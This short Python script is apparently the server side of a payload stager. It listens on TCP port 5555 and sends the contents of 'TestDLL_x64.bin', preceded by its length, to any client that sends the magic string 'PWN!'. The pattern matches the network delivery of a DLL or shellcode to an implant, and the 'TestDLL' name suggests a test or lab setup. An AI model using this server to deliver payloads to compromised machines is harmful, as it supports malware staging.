import socket
import binascii

f = open('TestDLL_x64.bin','rb')
buf = f.read()
len_buf = len(buf)
print(len_buf.to_bytes(4,byteorder='little', signed=True))
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('0.0.0.0',5555))
sock.listen(5)
while True:
    client,addr = sock.accept()
    magic = client.recv(4)
    print(type(magic))
    if magic.decode() == 'PWN!':
        
        client.send(len_buf.to_bytes(4,byteorder='little', signed=True))
        client.send(buf)
        client.close()